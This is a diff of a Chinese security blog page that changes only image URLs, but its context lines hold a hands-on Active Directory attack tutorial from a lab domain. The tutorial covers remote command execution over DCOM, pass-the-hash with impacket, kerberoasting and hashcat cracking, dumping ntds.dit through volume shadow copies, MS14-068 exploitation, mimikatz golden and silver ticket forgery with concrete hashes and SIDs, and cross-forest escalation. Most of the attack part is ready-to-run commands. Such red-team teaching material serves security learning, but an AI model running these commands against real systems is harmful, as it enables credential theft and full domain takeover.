+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902163458.png"></p>
 <p>获取目标系统中的网络共享目录</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902163631.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902163631.png"></p>
 <p>获取本地哈希</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902161205.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902161205.png"></p>
 <h2 id="2、DCOM-在远程系统中的使用"><a href="#2、DCOM-在远程系统中的使用" class="headerlink" title="2、DCOM 在远程系统中的使用"></a>2、DCOM 在远程系统中的使用</h2><p>COM 即组件对象模型 (Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成。</p>
 <p>COM 是许多微软产品和技术如 Windows 媒体播放器和 Windows Server 的基础。</p>
 <p>DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。</p>
@@ -2408,7 +2408,7 @@ wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX pro
 <p>在 MMC20.Application 中有个 ExecuteShellCommand 方法，我们可以拿它来执行命令，比如启动个计算器</p>
 <pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902171015.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902171015.png"></p>
 <p>除了 MMC20.Application 还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及 Outlook.Application 等等可以被我们利用。</p>
 <h3 id="使用-DCOM-在远程主机上执行命令"><a href="#使用-DCOM-在远程主机上执行命令" class="headerlink" title="使用 DCOM 在远程主机上执行命令"></a>使用 DCOM 在远程主机上执行命令</h3><p>在使用该方法时，需要具备以下条件：</p>
 <ul>
@@ -2422,14 +2422,14 @@ $com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F
 或者
 [Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902175722.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902175722.png"></p>
 <p>2、调用 ShellWindows 远程执行命令</p>
 <pre class="line-numbers language-none"><code class="language-none">$com&#x3D;[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;))
 $com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
 或者
 [Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902175207.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902175207.png"></p>
 <p>以上这两种方法均适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016 的系统。</p>
 <p>除了 MMC20.Application 和 ShellWindows，还有以下这几种 DCOM 对象可以被利用。</p>
 <p>3、调用 Excel.Application 远程执行命令</p>
@@ -2472,7 +2472,7 @@ $com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&
 <p>如果只知道 hash 也可以用 hash 去连接</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator@192.168.7.7 -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210904110328.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210904110328.png"></p>
 <h1 id="0x24-SPN-的应用"><a href="#0x24-SPN-的应用" class="headerlink" title="0x24 SPN 的应用"></a>0x24 SPN 的应用</h1><h2 id="0、前言-5"><a href="#0、前言-5" class="headerlink" title="0、前言"></a>0、前言</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>Windows 域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组和集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。</p>
 <p>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主题名称即 SPN (Service Principal Name）</p>
 <h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos 是由 MIT 提出的一种网络身份验证协议，旨在通过密钥加密技术为客户端/服务器应用程序提供强身份验证，它也是主要用在域环境下的身份认证协议。</p>
@@ -2489,7 +2489,7 @@ $com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&
 <li>TGT (Ticket Granting Ticket): 票证授予票证</li>
 <li>ST (Servre Ticket): 服务票据</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210906154732.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906154732.png"></p>
 <p>根据上图，这里一步一步进行解释</p>
 <p><strong>第一阶段：Clinet 与 AS</strong></p>
 <p>① 客户端向认证服务器 AS 发起请求，请求内容为自己的用户名、主机 IP 和当前时间戳。</p>
@@ -2531,7 +2531,7 @@ $com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&
 <p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用 CS_SK 加密的表示接受的信息，客户端接受到信息后也确认了服务端的真实性。</p>
 <p>至此，第三阶段通信完成，到这里整个 kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p>
 <p>这里可以再通过时序图加深下印象。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210906174237.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906174237.jpg"></p>
 <p>注意点：</p>
 <ul>
 <li>KDC 服务默认会安装在一个域的域控中</li>
@@ -2615,7 +2615,7 @@ $com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&
 <p>上面的工具都是在域内的机器里扫描 SPN 的，利用 impacket 工具包下的 GetUserSPNs.py 可以在非域主机中扫描目标的 SPN</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210906144640.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906144640.png"></p>
 <h2 id="2、kerberoast"><a href="#2、kerberoast" class="headerlink" title="2、kerberoast"></a>2、kerberoast</h2><p>kerberoast 是一种针对 Kerberos 协议的利用方式，在因为需要使用某个特定资源而向 TGS 发送 Kerberos 服务票据的请求时，用户首先需要使用具有有效身份权限的 TGT 向 TGS 请求相应服务的票据。</p>
 <p>当 TGT 被验证有效且具有该服务的权限时，TGS 会向用户发送一张票据。该票据使用与 SPN 相关联的计算机服务账号的 NTLM Hash（RC4_HMAC_MD5），就是说，RT 会通过 Kerberoast 尝试使用不同的 NTLM Hash 来打开该 Kerberos 票据，如果 RT 使用的 NTLM Hash 是正确的，Kerberos 票据就会被打开，而该 NTLM Hash 对应于该计算机服务账号的密码。</p>
 <p>kerberoast 的利用思路：</p>
@@ -2659,7 +2659,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
 <p>也可以使用 impacket 获取票据</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -request -dc-ip 192.168.7.7 -debug teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210907113159.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113159.png"></p>
 <p>将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 tgsreperack.py 脚本破解票据的 NTLM Hash</p>
 <p>Kerberoast 脚本下载地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
 <pre class="line-numbers language-none"><code class="language-none">python tgsreperack.py password.txt mssql.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -2667,7 +2667,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
 <p>或者使用 hashcat 破解 powershell 脚本、Rubeus、impacket 获取到的服务票据</p>
 <pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210907113300.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113300.png"></p>
 <h1 id="0x25-Exchange-邮件服务器"><a href="#0x25-Exchange-邮件服务器" class="headerlink" title="0x25 Exchange 邮件服务器"></a>0x25 Exchange 邮件服务器</h1><h2 id="1、Exchange-的基本操作"><a href="#1、Exchange-的基本操作" class="headerlink" title="1、Exchange 的基本操作"></a>1、Exchange 的基本操作</h2><blockquote>
 <p>在 Exchange 服务器上的 PowerShell 里进行以下操作</p>
 </blockquote>
@@ -2710,7 +2710,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
 
 <p>使用图形化界面导出电子邮件，访问 <a target="_blank" rel="noopener" href="https://127.0.0.1/ecp%EF%BC%8C%E6%89%93%E5%BC%80">https://127.0.0.1/ecp，打开</a> Exchange 管理中心的登录界面。</p>
 <p>输入账号密码进入 Exchange 管理中心，点击「…」更多按钮，选择「导出到 PST 文件」即可进行导出操作。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210908104558.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908104558.png"></p>
 <h3 id="管理导出请求"><a href="#管理导出请求" class="headerlink" title="管理导出请求"></a>管理导出请求</h3><p>不论是通过 Powershell 导出还是通过图形化的方式导出，都会在 Exchange 中生成一条告警信息，这些信息有助于 BT 发现服务器里的异常行为，通过以下命令，可以查看之前的导出请求记录信息。</p>
 <pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -2743,7 +2743,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
 <p>查询当前系统中的快照，可以看到没有任何快照</p>
 <pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;List All&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210908135855.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908135855.png"></p>
 <h3 id="vssadmin"><a href="#vssadmin" class="headerlink" title="vssadmin"></a>vssadmin</h3><p>vssadmin 可用于创建和删除卷影拷贝、列出卷影的信息（只能管理系统 Provider 创建的卷影拷贝）、显示已安装的所有卷影拷贝写入程序（writers）和提供程序（providers），以及改变卷影拷贝的存储空间（即所谓的 “diff 空间”）的大小等。</p>
 <p>vssadmin 的使用流程和 ntdsutil 差不多，首先创建一个 C 盘的卷影拷贝</p>
 <pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -2754,7 +2754,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
 <p>删除快照</p>
 <pre class="line-numbers language-none"><code class="language-none">vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;quiet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210908145721.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908145721.png"></p>
 <h3 id="vssown-vbs"><a href="#vssown-vbs" class="headerlink" title="vssown.vbs"></a>vssown.vbs</h3><p>vssown.vbs 脚本的功能和 vssadmin 类似，可用于创建和删除卷影拷贝以及启动和停止卷影拷贝服务。</p>
 <p>vssown.vbs 下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p>
 <p>启动卷影拷贝服务</p>
@@ -2772,7 +2772,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
 <p>删除卷影拷贝</p>
 <pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;delete &#123;22B93FE6-D53A-4ECA-BD5A-7A2A68203EF8&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210908152359.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908152359.png"></p>
 <h3 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h3><p>除了上面介绍的通过执行命令来提取 ntds.dit，也可以通过创建一个 IFM 的方式获取 ntds.dit</p>
 <p>在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p>
 <p>在域控中以管理员模式打开命令行环境，输入命令</p>
@@ -2799,7 +2799,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
 <p>因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p>
 <pre class="line-numbers language-none"><code class="language-none">reg save hklm\system c:\windows\temp\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210908155944.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908155944.png"></p>
 <h3 id="Invoke-NinjaCopy-ps1"><a href="#Invoke-NinjaCopy-ps1" class="headerlink" title="Invoke-NinjaCopy.ps1"></a>Invoke-NinjaCopy.ps1</h3><p>PowerSploit 工具包里的 Invoke-NinjaCopy.ps1 脚本也可以提取 ntds.dit 文件，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p>
 <p>PowerSploit 工具包项目地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
 <pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -2825,7 +2825,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
 <blockquote>
 <p>如果提示 ImportError: No module named Crypto.Hash，直接 pip install pycryptodome 即可</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210908171420.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908171420.png"></p>
 <p>ntds.dit 包含域内的所有信息，可以通过分析 ntds.dit 导出域内的计算机信息以及其他信息，最后结果将保存在 all_computers.csv 文件内</p>
 <pre class="line-numbers language-none"><code class="language-none">python2 dscomputers.py ntds.dit.export&#x2F;datatable.3 computer_output --csvoutfile all_computers.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -2951,7 +2951,7 @@ reg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-row
 <blockquote>
 <p>这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 </p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109231733653.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231733653.png"></p>
 <h2 id="2、GoldenPac"><a href="#2、GoldenPac" class="headerlink" title="2、GoldenPac"></a>2、GoldenPac</h2><p>goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p>
 <p>Kali 在使用之前需要先安装 Kerberos 客户端</p>
 <pre class="line-numbers language-none"><code class="language-none">apt-get install krb5-user -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -2962,7 +2962,7 @@ reg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-row
 <blockquote>
 <p>这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109231746641.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231746641.png"></p>
 <p>goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。</p>
 <h2 id="3、kekeo"><a href="#3、kekeo" class="headerlink" title="3、kekeo"></a>3、kekeo</h2><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
 <p>使用之前需要先清除票据</p>
@@ -3011,9 +3011,9 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <pre class="line-numbers language-none"><code class="language-none">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109240943968.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109240943968.png"></p>
 <p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109241000974.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109241000974.png"></p>
 <h1 id="0x28-黄金票据"><a href="#0x28-黄金票据" class="headerlink" title="0x28 黄金票据"></a>0x28 黄金票据</h1><h2 id="0、前言-8"><a href="#0、前言-8" class="headerlink" title="0、前言"></a>0、前言</h2><p>RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：</p>
 <ul>
 <li>伪造的域管理员用户名</li>
@@ -3054,7 +3054,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <pre class="line-numbers language-none"><code class="language-none">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="4、验证权限"><a href="#4、验证权限" class="headerlink" title="4、验证权限"></a>4、验证权限</h2><p>退出 mimikatz ，使用 dir 发现可以成功列出域控文件</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109271559013.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271559013.png"></p>
 <p>这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据</p>
 <pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;aes256:3dfa1f9b5809250a7670c12d1e109f0acb9660f902da8aa3a4be55a16affbbd5 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -3069,7 +3069,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>注入成功后，进入 Shell 就能查看 dc 里的文件了</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202109271628454.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271628454.png"></p>
 <h1 id="0x29-白银票据"><a href="#0x29-白银票据" class="headerlink" title="0x29 白银票据"></a>0x29 白银票据</h1><h2 id="0、前言-9"><a href="#0、前言-9" class="headerlink" title="0、前言"></a>0、前言</h2><p>白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）</p>
 <blockquote>
 <p>Kerberos 协议详解：<a target="_blank" rel="noopener" href="https://teamssix.com/210923-151418.html">https://teamssix.com/210923-151418.html</a></p>
@@ -3096,7 +3096,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <p>使用 mimikatz 生成伪造的白银票据</p>
 <pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre><code>![](https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110091330529.png)
+<pre><code>![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091330529.png)
 </code></pre>
 <p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p>
 <h2 id="2、伪造-LDAP-服务权限"><a href="#2、伪造-LDAP-服务权限" class="headerlink" title="2、伪造 LDAP 服务权限"></a>2、伪造 LDAP 服务权限</h2><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p>
@@ -3106,7 +3106,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <p>接下来生成 LDAP 服务的白银票据</p>
 <pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110091403286.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091403286.png"></p>
 <h1 id="0x30-跨域安全"><a href="#0x30-跨域安全" class="headerlink" title="0x30 跨域安全"></a>0x30 跨域安全</h1><h2 id="0、前言-10"><a href="#0、前言-10" class="headerlink" title="0、前言"></a>0、前言</h2><p>常见的跨域攻击方法有以下几种：</p>
 <p>i、利用常规的渗透方法，比如 Web 漏洞</p>
 <p>ii、利用已知散列值进行哈希传递或票据传递，因为有可能域内的密码是通用的</p>
@@ -3155,7 +3155,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <p>使用 dir 访问目标域控</p>
 <pre class="line-numbers language-none"><code class="language-none">dir \\dc.teamssix.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110211307519.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110211307519.png"></p>
 <h2 id="3、利用-krbtgt-散列值获取目标域的权限"><a href="#3、利用-krbtgt-散列值获取目标域的权限" class="headerlink" title="3、利用 krbtgt 散列值获取目标域的权限"></a>3、利用 krbtgt 散列值获取目标域的权限</h2><p>如果攻击者获取了林内任意域的 krbtgt 散列值，就可以使用 sidHistory 获得该林的完整权限。</p>
 <p>首先获取当前子域和父域的 SID 值，可以使用以下工具或命令</p>
 <pre class="line-numbers language-none"><code class="language-none">wmic useraccount get caption,sidwhoami &#x2F;useradfind.exe -sc u:user4 | findstr SidGet-DomainSID sub.teamssix.com  # PowerView 里的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -3166,7 +3166,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <p>在子域普通用户权限的计算机中构造黄金票据</p>
 <pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;krbtgt:b53a5c7c51648f033b96971e7ae4ee45 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110211315739.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110211315739.png"></p>
 <h2 id="4、利用无约束委派和-MS-RPRN-获取信任林权限"><a href="#4、利用无约束委派和-MS-RPRN-获取信任林权限" class="headerlink" title="4、利用无约束委派和 MS-RPRN 获取信任林权限"></a>4、利用无约束委派和 MS-RPRN 获取信任林权限</h2><p>如果已经获取了域林中某个域控权限，或者配置了无约束委派的任何服务器的权限，那么就可以使用 MS RPRN 的 RpcRemoteFindPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，利用捕获的票据获取信任林内任意用户的哈希值。</p>
 <p>假设这里获取了 teamssix.com 域的域控权限，且 0day.org 与 teamssix.com 域有林信任关系</p>
 <p>首先在 teamssix.com 的域控上监听身份认证请求</p>
@@ -3199,7 +3199,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7311">https://xz.aliyun.com/t/7311</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7875">https://xz.aliyun.com/t/7875</a><br><a target="_blank" rel="noopener" href="https://bipy.me/post/crack-rar/">https://bipy.me/post/crack-rar/</a><br><a target="_blank" rel="noopener" href="https://ehang-io.github.io/nps/">https://ehang-io.github.io/nps/</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/DMZ">https://baike.baidu.com/item/DMZ</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/AGDLP">https://baike.baidu.com/item/AGDLP</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/23a4e8978a30">https://www.jianshu.com/p/23a4e8978a30</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/27730ab4a6db">https://www.jianshu.com/p/27730ab4a6db</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/331aa59fff5d">https://www.jianshu.com/p/331aa59fff5d</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a210528f9b35">https://www.jianshu.com/p/a210528f9b35</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c8f5c374466a">https://www.jianshu.com/p/c8f5c374466a</a><br><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/10/nc.html">https://www.sqlsec.com/2019/10/nc.html</a><br><a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Powerup.html">https://evi1cg.me/archives/Powerup.html</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a><br><a target="_blank" 